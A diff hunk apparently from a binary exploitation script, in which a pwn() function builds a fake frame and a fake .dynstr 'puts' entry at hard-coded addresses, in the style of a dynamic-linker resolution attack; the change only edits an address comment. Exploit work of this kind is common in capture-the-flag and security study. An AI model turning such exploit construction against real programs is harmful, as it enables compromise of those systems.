@@ -1317,7 +1317,7 @@ def pwn():
     fake_frame += p64(0x00)            #0x404098 - 0x4040a0               #st_size
 
     #fake .dynstr entry
-    fake_frame += b'puts\x00'          #0x4040a8 -                        #fake dynstr entry 
+    fake_frame += b'puts\x00'          #0x4040a0                        #fake dynstr entry 
 
 
 
